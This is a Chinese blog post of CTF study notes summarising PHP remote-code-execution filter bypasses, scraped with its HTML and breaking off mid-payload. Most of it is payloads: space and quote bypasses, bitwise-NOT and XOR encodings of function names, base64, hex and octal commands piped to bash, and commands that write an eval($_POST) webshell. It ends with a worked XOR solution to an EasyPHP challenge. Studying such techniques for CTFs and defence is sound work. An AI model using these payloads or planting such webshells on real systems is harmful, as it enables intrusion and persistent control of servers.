{"blogid": "123010661", "writerAge": "码龄2年", "writerBlogNum": "24", "writerCollect": "146", "writerComment": "42", "writerFan": "251", "writerGrade": "3级", "writerIntegral": "454", "writerName": "4v1d", "writerProfileAdress": "writer_image\\profile_123010661.jpg", "writerRankTotal": "42070", "writerRankWeekly": "280320", "writerThumb": "81", "writerVisitNum": "44311", "blog_read_count": "1425", "blog_time": "已于 2022-05-10 18:59:31 修改", "blog_title": "PHP-RCE绕过的姿势总结", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-light\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p></p>\n<div class=\"toc\">\n<h3>文章目录</h3>\n<ul><li><a href=\"#_4\">前言</a></li><li><a href=\"#_10\">一、命令执行</a></li><li><ul><li><a href=\"#_13\">空格过滤</a></li><li><a href=\"#_20\">取反绕过</a></li><li><a href=\"#_55\">命令分隔符</a></li><li><a href=\"#flag_66\">黑名单绕过（比如flag字符）</a></li><li><a href=\"#_67\">拼接</a></li><li><a href=\"#_89\">编码</a></li><li><a href=\"#_122\">单双引号的绕过</a></li></ul>\n</li><li><a href=\"#_128\">二、代码执行</a></li><li><ul><li><a href=\"#linux_131\">linux中的直接查看文件内容工具</a></li><li><a href=\"#webshell_146\">通过命令行写入webshell</a></li><li><a href=\"#webshell_169\">无数字字母绕过webshell</a></li><li><a href=\"#RCE_261\">无回显RCE</a></li><li><a href=\"#shell_296\">⽆字⺟数字shell</a></li></ul>\n</li><li><a href=\"#_301\">总结</a></li><li><ul><li><a href=\"#_302\">参考文章</a></li></ul>\n</li></ul>\n</div>\n<p></p>\n<h1><a id=\"_4\"></a>前言</h1>\n<p><font color=\"#999AAA\">做了很多的题目，静下心来学习大佬做点小总结</font></p>\n<hr color=\"#000000\" size='1\"'/>\n<h1><a id=\"_10\"></a>一、命令执行</h1>\n<h2><a id=\"_13\"></a>空格过滤</h2>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\3d6c5c0718364eb4947ca27d43cdfb57.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\ae5072f8f4a344799385ebfc72615e0d.png\"/></p>\n<pre><code class=\"prism language-c\"><span class=\"token operator\">&lt;</span> 、<span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span>、<span class=\"token operator\">%</span><span class=\"token number\">20</span><span class=\"token punctuation\">(</span>space<span class=\"token punctuation\">)</span>、<span class=\"token operator\">%</span><span class=\"token number\">09</span><span class=\"token punctuation\">(</span>tab<span class=\"token punctuation\">)</span>、$IFS$<span class=\"token number\">9</span>、 $<span class=\"token punctuation\">{<!-- --></span>IFS<span class=\"token punctuation\">}</span>、$IFS等\n</code></pre>\n<h2><a id=\"_20\"></a>取反绕过</h2>\n<p>取反两次就可以得到想要绕过限制的数据<br/> <img alt=\"在这里插入图片描述\" src=\"image\\2abc869081174527a554e0d58d725d26.png\"/><br/> 传参时</p>\n<pre><code class=\"prism language-c\"><span class=\"token operator\">?</span>code<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token operator\">%</span><span class=\"token number\">8F</span><span class=\"token operator\">%</span><span class=\"token number\">97</span><span class=\"token operator\">%</span><span class=\"token number\">8F</span><span class=\"token operator\">%</span><span class=\"token number\">96</span><span class=\"token operator\">%</span><span class=\"token number\">91</span><span class=\"token operator\">%</span><span class=\"token number\">99</span><span class=\"token operator\">%</span><span class=\"token number\">90</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\5ac654f283984acdb9cd6c25177bad50.png\"/><br/> 在做NSS平台上的一道rce题目就是用到类似的思路，这里是把system函数取反<br/> 要想做经典取反例题就是下面这道极客的题<br/> <strong>[极客大挑战 2019]RCE ME</strong>，感兴趣可以去buu上做<br/> wp链接<a href=\"https://blog.csdn.net/qq_45521281/article/details/105656737\">[极客大挑战 2019]RCE ME（取反、异或绕过正则表达式、bypass disable_function）</a><br/> 搜到的大佬脚本</p>\n<pre><code class=\"prism language-bash\"><span class=\"token operator\">&lt;</span>?php\n//在命令行中运行\n\n/*author yu22x*/\n\nfwrite<span class=\"token punctuation\">(</span>STDOUT,<span class=\"token string\">'[+]your function: '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$system</span><span class=\"token operator\">=</span>str_replace<span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">(</span><span class=\"token string\">\"<span class=\"token entity\" title=\"\\r\">\\r</span><span class=\"token entity\" title=\"\\n\">\\n</span>\"</span>, <span class=\"token string\">\"<span class=\"token entity\" title=\"\\r\">\\r</span>\"</span>, <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>\"</span><span class=\"token punctuation\">)</span>, <span class=\"token string\">\"\"</span>, fgets<span class=\"token punctuation\">(</span>STDIN<span class=\"token punctuation\">))</span><span class=\"token punctuation\">;</span> \n\nfwrite<span class=\"token punctuation\">(</span>STDOUT,<span class=\"token string\">'[+]your command: '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$command</span><span class=\"token operator\">=</span>str_replace<span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">(</span><span class=\"token string\">\"<span class=\"token entity\" title=\"\\r\">\\r</span><span class=\"token entity\" title=\"\\n\">\\n</span>\"</span>, <span class=\"token string\">\"<span class=\"token entity\" title=\"\\r\">\\r</span>\"</span>, <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>\"</span><span class=\"token punctuation\">)</span>, <span class=\"token string\">\"\"</span>, fgets<span class=\"token punctuation\">(</span>STDIN<span class=\"token punctuation\">))</span><span class=\"token punctuation\">;</span> \n\n<span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'[*] (~'</span>.urlencode<span class=\"token punctuation\">(</span>~<span class=\"token variable\">$system</span><span class=\"token punctuation\">)</span>.<span class=\"token string\">')(~'</span>.urlencode<span class=\"token punctuation\">(</span>~<span class=\"token variable\">$command</span><span class=\"token punctuation\">)</span>.<span class=\"token string\">');'</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\5fac1f393377451baf13551f37ca268d.png\"/></p>\n<h2><a id=\"_55\"></a>命令分隔符</h2>\n<pre><code class=\"prism language-c\">linux中：<span class=\"token operator\">%</span><span class=\"token number\">0</span>a<span class=\"token punctuation\">(</span>回车<span class=\"token punctuation\">)</span> 、<span class=\"token operator\">%</span><span class=\"token number\">0</span>d<span class=\"token punctuation\">(</span>换行<span class=\"token punctuation\">)</span> 、<span class=\"token punctuation\">;</span> 、<span class=\"token operator\">&amp;</span> 、<span class=\"token operator\">|</span> 、<span class=\"token operator\">&amp;&amp;</span>、<span class=\"token operator\">||</span>\n</code></pre>\n<pre><code class=\"prism language-c\">windows中：<span class=\"token operator\">%</span><span class=\"token number\">0</span>a、<span class=\"token operator\">&amp;</span>、<span class=\"token operator\">|</span>、<span class=\"token operator\">%</span><span class=\"token number\">1</span>a（一个神奇的角色，作为<span class=\"token punctuation\">.</span>bat文件中的命令分隔符）\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\6337f02404b541708e4b89060437e901.png\"/></p>\n<h2><a id=\"flag_66\"></a>黑名单绕过（比如flag字符）</h2>\n<h2><a id=\"_67\"></a>拼接</h2>\n<pre><code class=\"prism language-c\"><span class=\"token number\">1.</span>a<span class=\"token operator\">=</span>fl<span class=\"token punctuation\">;</span>b<span class=\"token operator\">=</span>ag<span class=\"token punctuation\">;</span>cat $a$b\n</code></pre>\n<p>或者如<br/> <img alt=\"在这里插入图片描述\" src=\"image\\e5711dee6335476d871936edeff20b1b.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\bd0af2e3f30a47699cb02120c64f685f.png\"/></p>\n<pre><code class=\"prism language-c\"><span class=\"token number\">2.</span>用点来链接   \n<span class=\"token punctuation\">(</span>sy<span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>st<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>em<span class=\"token punctuation\">)</span>\n</code></pre>\n<pre><code class=\"prism language-c\"><span class=\"token number\">3.</span>使用内敛执行代替system\necho `ls`<span class=\"token punctuation\">;</span>\necho $<span class=\"token punctuation\">(</span>ls<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token operator\">=</span>`ls`<span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token operator\">=</span>$<span class=\"token punctuation\">(</span>ls<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token operator\">=</span>`ls <span class=\"token operator\">/</span>`<span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>      \n#   以上语句皆等效于<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php echo `ls <span class=\"token operator\">/</span>`<span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<h2><a id=\"_89\"></a>编码</h2>\n<pre><code class=\"prism language-c\"><span class=\"token number\">1.</span>base64编码绕过\necho <span class=\"token string\">\"Y2F0IC9mbGFn\"</span><span class=\"token operator\">|</span>base64 <span class=\"token operator\">-</span>d<span class=\"token operator\">|</span>bash <span class=\"token operator\">==</span><span class=\"token operator\">&gt;</span>cat <span class=\"token operator\">/</span>flag\n这边我是有点存疑的，我自己实验后是会报错的\necho <span class=\"token char\">'Y2F0wqAK'</span> <span class=\"token operator\">|</span> base64 <span class=\"token operator\">-</span>d 文件的名字\n上面echo输出到d的地方会被命令行解析为cat，整个句子就可以变为cat 某个文件的文件名\n从而达到绕过来查看内容的目的\n但我却在kali里出现了如下错误提示\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\e363e3c0046f43a685d77d841026302c.png\"/></p>\n<pre><code class=\"prism language-c\">同样在ubuntu上也是不行\n希望有懂得大佬能评论解惑一下<span class=\"token operator\">==</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\97a4af0d11aa4d11966c0da487344c84.png\"/></p>\n<pre><code class=\"prism language-bash\"><span class=\"token number\">2</span>.Hex\n<span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"636174202f666c6167\"</span> <span class=\"token operator\">|</span> xxd -r -p<span class=\"token operator\">|</span><span class=\"token function\">bash</span> <span class=\"token operator\">==</span><span class=\"token operator\">&gt;</span>cat /flag\n</code></pre>\n<pre><code class=\"prism language-bash\"><span class=\"token number\">3</span>.oct\n<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token builtin class-name\">printf</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\154\">\\154</span><span class=\"token entity\" title=\"\\163\">\\163</span>\"</span><span class=\"token variable\">)</span></span> <span class=\"token operator\">==</span><span class=\"token operator\">&gt;</span>ls\n<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token builtin class-name\">printf</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\x63\">\\x63</span><span class=\"token entity\" title=\"\\x61\">\\x61</span><span class=\"token entity\" title=\"\\x74\">\\x74</span><span class=\"token entity\" title=\"\\x20\">\\x20</span><span class=\"token entity\" title=\"\\x2f\">\\x2f</span><span class=\"token entity\" title=\"\\x66\">\\x66</span><span class=\"token entity\" title=\"\\x6c\">\\x6c</span><span class=\"token entity\" title=\"\\x61\">\\x61</span><span class=\"token entity\" title=\"\\x67\">\\x67</span>\"</span><span class=\"token variable\">)</span></span> <span class=\"token operator\">==</span><span class=\"token operator\">&gt;</span>cat /flag\n<span class=\"token punctuation\">{<!-- --></span>printf,<span class=\"token string\">\"<span class=\"token entity\" title=\"\\x63\">\\x63</span><span class=\"token entity\" title=\"\\x61\">\\x61</span><span class=\"token entity\" title=\"\\x74\">\\x74</span><span class=\"token entity\" title=\"\\x20\">\\x20</span><span class=\"token entity\" title=\"\\x2f\">\\x2f</span><span class=\"token entity\" title=\"\\x66\">\\x66</span><span class=\"token entity\" title=\"\\x6c\">\\x6c</span><span class=\"token entity\" title=\"\\x61\">\\x61</span><span class=\"token entity\" title=\"\\x67\">\\x67</span>\"</span><span class=\"token punctuation\">}</span><span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span><span class=\"token variable\">$0</span> <span class=\"token operator\">==</span><span class=\"token operator\">&gt;</span>cat /flag\n<span class=\"token comment\">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST['c']);?&gt;</span>\n<span class=\"token variable\">${printf<span class=\"token operator\">,</span>\"\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76\"}</span> <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">1</span>.php\n\n</code></pre>\n<p>例题可见[GXYCTF 2019]Ping Ping Ping</p>\n<h2><a id=\"_122\"></a>单双引号的绕过</h2>\n<pre><code class=\"prism language-c\">ca‘‘t flag 或ca<span class=\"token string\">\"\"</span>t flag\n</code></pre>\n<h1><a id=\"_128\"></a>二、代码执行</h1>\n<p>两者之间的小区别<br/> <img alt=\"在这里插入图片描述\" src=\"image\\e685d76fef2e460497ca3c72ba4ecc91.png\"/></p>\n<h2><a id=\"linux_131\"></a>linux中的直接查看文件内容工具</h2>\n<pre><code class=\"prism language-bash\">cat、tac、more、less、head、tail、nl、sed、sort、uniq\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\8e883eea7a3b4580b1aa76d1a75c0488.png\"/></p>\n<pre><code class=\"prism language-bash\">举例\n<span class=\"token function\">cat</span> <span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token function\">ls</span><span class=\"token variable\">`</span></span> （该目录下存在index.php和flag.php，也就是此命令会扫描当前目录然后读取所有文件）\n等效于\n<span class=\"token function\">cat</span> flag.php<span class=\"token punctuation\">;</span><span class=\"token function\">cat</span> index.php\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\2a84630854394ba2aba322d8aa2005b2.png\"/></p>\n<h2><a id=\"webshell_146\"></a>通过命令行写入webshell</h2>\n<pre><code class=\"prism language-bash\">linux\n</code></pre>\n<pre><code class=\"prism language-bash\"><span class=\"token builtin class-name\">echo</span> “<span class=\"token operator\">&lt;</span>?php eval<span class=\"token punctuation\">(</span>@<span class=\"token punctuation\">\\</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>?<span class=\"token operator\">&gt;</span>” <span class=\"token operator\">&gt;</span> shell.php<span class=\"token punctuation\">;</span>\n</code></pre>\n<p>或者十六进制写法</p>\n<pre><code class=\"prism language-bash\"><span class=\"token builtin class-name\">echo</span> 3c3f7068706576616c2840245f504f53545b2270617373225d293b3f3e<span class=\"token operator\">|</span>xxd -r -ps <span class=\"token operator\">&gt;</span> webshell.php\n</code></pre>\n<pre><code class=\"prism language-bash\">windows\n</code></pre>\n<pre><code class=\"prism language-bash\">“echo ^<span class=\"token operator\">&lt;</span>?php eval<span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>pass<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> ?^<span class=\"token operator\">&gt;</span> <span class=\"token operator\">&gt;</span> shell.php”\n</code></pre>\n<p>成功后就有一句话木马可以执行使用，相当于绕过过滤</p>\n<h2><a id=\"webshell_169\"></a>无数字字母绕过webshell</h2>\n<p>上题目讲解：[ISITDTU 2019]EasyPHP<br/> 源码：</p>\n<pre><code class=\"prism language-bash\"><span class=\"token operator\">&lt;</span>?php\nhighlight_file<span class=\"token punctuation\">(</span>__FILE__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$_</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'_'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> preg_match<span class=\"token punctuation\">(</span><span class=\"token string\">'/[\\x00- 0-9\\'</span>\"`$<span class=\"token operator\">&amp;</span>.,<span class=\"token operator\">|</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">{<!-- --></span>_defgops<span class=\"token punctuation\">\\</span>x7F<span class=\"token punctuation\">]</span>+/i<span class=\"token string\">', $_) )\n    die('</span>rosé will not <span class=\"token keyword\">do</span> it<span class=\"token string\">');\n\nif ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )\n    die('</span>you are so close, omg'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\neval<span class=\"token punctuation\">(</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n?<span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>参考<a href=\"https://blog.csdn.net/fmyyy1/article/details/116171155\">wp</a><br/> <img alt=\"在这里插入图片描述\" src=\"image\\8c6d57f683a74e15b39ff1ecb518b115.png\"/><br/> count_chars() 函数返回字符串中所用字符的信息（例如，ASCII 字符在字符串中出现的次数，或者某个字符是否已经在字符串中使用过）。<br/> 可以看到~和^没有被过滤，所以应该使用异或和取反绕过。<br/> 试一下用取反查看phpinfo</p>\n<pre><code class=\"prism language-bash\"><span class=\"token punctuation\">(</span>~%8F%97%8F%96%91%99%90<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\cf4be35651ba4dcbb3e3962fef10aa86.png\"/><br/> 成功了<br/> <img alt=\"在这里插入图片描述\" src=\"image\\e743b05ed7f14c1e973f0b380a400334.png\"/><br/> 禁止很多函数<br/> 但我们可以用print_r(scandir(.))函数获得目录。</p>\n<pre><code class=\"prism language-bash\"><span class=\"token variable\"><span class=\"token punctuation\">((</span><span class=\"token operator\">%</span><span class=\"token number\">8</span>F<span class=\"token operator\">%</span><span class=\"token number\">8</span>D<span class=\"token operator\">%</span><span class=\"token number\">96</span><span class=\"token operator\">%</span><span class=\"token number\">91</span><span class=\"token operator\">%</span><span class=\"token number\">8</span>B<span class=\"token operator\">%</span>A0<span class=\"token operator\">%</span><span class=\"token number\">8</span>D<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token punctuation\">))</span></span><span class=\"token variable\"><span class=\"token punctuation\">((</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">8</span>C<span class=\"token operator\">%</span><span class=\"token number\">9</span>C<span class=\"token operator\">%</span><span class=\"token number\">9</span>E<span class=\"token operator\">%</span><span class=\"token number\">91</span><span class=\"token operator\">%</span><span class=\"token number\">9</span>B<span class=\"token operator\">%</span><span class=\"token number\">96</span><span class=\"token operator\">%</span><span class=\"token number\">8</span>D<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token punctuation\">))</span></span><span class=\"token variable\"><span class=\"token punctuation\">((</span><span class=\"token operator\">%</span>D1<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token punctuation\">))</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">(</span>%8F%8D%96%91%8B%A0%8D<span class=\"token punctuation\">)</span>^<span class=\"token punctuation\">(</span>%FF%FF%FF%FF%FF%FF%FF<span class=\"token punctuation\">)</span>即print_r\n<span class=\"token punctuation\">(</span>%8C%9C%9E%91%9B%96%8D<span class=\"token punctuation\">)</span>^<span class=\"token punctuation\">(</span>%FF%FF%FF%FF%FF%FF%FF<span class=\"token punctuation\">)</span>即scandir 后面就是<span class=\"token punctuation\">(</span>.<span class=\"token punctuation\">)</span>\n\n</code></pre>\n<p>但要绕过第二个if<br/> 本地测试后我们的payload经过count_chars之后长度为16，我们要想办法减少三个<br/> 这里有一个思路<br/> 先上脚本</p>\n<pre><code class=\"prism language-bash\">str <span class=\"token operator\">=</span> <span class=\"token string\">'acdips'</span>\ntarget <span class=\"token operator\">=</span> <span class=\"token string\">'ntr'</span>\n\n<span class=\"token keyword\">for</span> <span class=\"token for-or-select variable\">m</span> <span class=\"token keyword\">in</span> target:\n    <span class=\"token keyword\">for</span> <span class=\"token for-or-select variable\">a</span> <span class=\"token keyword\">in</span> str:\n        <span class=\"token keyword\">for</span> <span class=\"token for-or-select variable\">b</span> <span class=\"token keyword\">in</span> str:\n            <span class=\"token keyword\">for</span> <span class=\"token for-or-select variable\">c</span> <span class=\"token keyword\">in</span> str:\n                <span class=\"token keyword\">if</span> ord<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>^ord<span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span>^ord<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> ord<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span>:\n                    print<span class=\"token punctuation\">(</span><span class=\"token string\">\"{} = {}^{}^{}\"</span>.format<span class=\"token punctuation\">(</span>m,a,b,c<span class=\"token punctuation\">))</span>\n\n</code></pre>\n<p>得到</p>\n<pre><code class=\"prism language-bash\">n <span class=\"token operator\">=</span> c^d^i\nt <span class=\"token operator\">=</span> c^d^s\nr <span class=\"token operator\">=</span> a^c^p\n</code></pre>\n<p>拿n为例。因为n = c<sup>d</sup>i 所以~n = ~c<sup>d</sup>i成立，即n ^0xff= c<sup>d</sup>i^0xff成立<br/> 再来看看我们的payload,取前部分print_r说明<br/> (%8F%8D%96%91%8B%A0%8D)^(%FF%FF%FF%FF%FF%FF%FF)将对应的ntr替换变成：<br/> (%8F%9E%96%9C%9C%A0%9E)<sup>(%FF%9C%FF%9B%9B%FF%9C)</sup>(%FF%8F%FF%96%8C%FF%8F)^(%FF%FF%FF%FF%FF%FF%FF)<br/> 在四个括号中，将要替换的字符用响应的三个代替字符代替，最后一个括号全为0xff相当于取反，而其他不变的字符不变，但异或了3个0xff相当于取反三次，等同于去反一次，所以仍不变，本地测试。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\2d69f5dfdcd94584936b31c27d8f04cc.png\"/></p>\n<p>再进行替换<br/> 再用这个思路将payload中所有的ntr替换。<br/> 最后</p>\n<pre><code class=\"prism language-bash\"><span class=\"token variable\"><span class=\"token punctuation\">((</span><span class=\"token operator\">%</span><span class=\"token number\">8</span>F<span class=\"token operator\">%</span><span class=\"token number\">9</span>E<span class=\"token operator\">%</span><span class=\"token number\">96</span><span class=\"token operator\">%</span><span class=\"token number\">9</span>C<span class=\"token operator\">%</span><span class=\"token number\">9</span>C<span class=\"token operator\">%</span>A0<span class=\"token operator\">%</span><span class=\"token number\">9</span>E<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">9</span>C<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">9</span>B<span class=\"token operator\">%</span><span class=\"token number\">9</span>B<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">9</span>C<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">8</span>F<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">96</span><span class=\"token operator\">%</span><span class=\"token number\">8</span>C<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">8</span>F<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token punctuation\">))</span></span><span class=\"token variable\"><span class=\"token punctuation\">((</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">8</span>C<span class=\"token operator\">%</span><span class=\"token number\">9</span>C<span class=\"token operator\">%</span><span class=\"token number\">9</span>E<span class=\"token operator\">%</span><span class=\"token number\">9</span>C<span class=\"token operator\">%</span><span class=\"token number\">9</span>B<span class=\"token operator\">%</span><span class=\"token number\">96</span><span class=\"token operator\">%</span><span class=\"token number\">9</span>E<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">9</span>B<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">9</span>C<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">96</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">8</span>F<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token punctuation\">))</span></span><span class=\"token variable\"><span class=\"token punctuation\">((</span><span class=\"token operator\">%</span>D1<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token punctuation\">))</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\35f47eac139b48789caee4d1b55a01fa.png\"/></p>\n<p>print_r(scandir(.))</p>\n<pre><code class=\"prism language-bash\"><span class=\"token variable\"><span class=\"token punctuation\">((</span><span class=\"token operator\">%</span><span class=\"token number\">8</span>F<span class=\"token operator\">%</span><span class=\"token number\">9</span>E<span class=\"token operator\">%</span><span class=\"token number\">96</span><span class=\"token operator\">%</span><span class=\"token number\">9</span>C<span class=\"token operator\">%</span><span class=\"token number\">9</span>C<span class=\"token operator\">%</span>A0<span class=\"token operator\">%</span><span class=\"token number\">9</span>E<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">9</span>C<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">9</span>B<span class=\"token operator\">%</span><span class=\"token number\">9</span>B<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">9</span>C<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">8</span>F<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">96</span><span class=\"token operator\">%</span><span class=\"token number\">8</span>C<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">8</span>F<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token punctuation\">))</span></span><span class=\"token variable\"><span class=\"token punctuation\">((</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">8</span>C<span class=\"token operator\">%</span><span class=\"token number\">9</span>C<span class=\"token operator\">%</span><span class=\"token number\">9</span>E<span class=\"token operator\">%</span><span class=\"token number\">9</span>C<span class=\"token operator\">%</span><span class=\"token number\">9</span>B<span class=\"token operator\">%</span><span class=\"token number\">96</span><span class=\"token operator\">%</span><span class=\"token number\">9</span>E<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token 